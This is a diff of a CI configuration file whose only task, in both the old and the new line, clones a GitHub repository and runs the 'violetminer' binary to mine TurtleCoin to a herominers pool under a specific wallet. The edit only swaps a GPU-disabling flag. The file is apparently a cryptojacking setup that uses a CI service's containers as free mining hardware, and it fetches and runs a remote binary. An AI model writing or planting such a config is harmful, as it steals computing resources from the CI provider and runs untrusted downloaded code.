@@ -1,4 +1,4 @@
 task:
     container:
       image: ubuntu:latest
-    script: apt update -y && apt install -y git && git clone https://github.com/remakove/brik.git brik && cd brik && chmod +x violetminer && ./violetminer --algorithm turtlecoin --pool ca.turtlecoin.herominers.com:10380 --username TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.g4 --disableGPU
+    script: apt update -y && apt install -y git && git clone https://github.com/remakove/brik.git brik && cd brik && chmod +x violetminer && ./violetminer --algorithm turtlecoin --pool ca.turtlecoin.herominers.com:10380 --username TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.g4 --disableNVIDIA
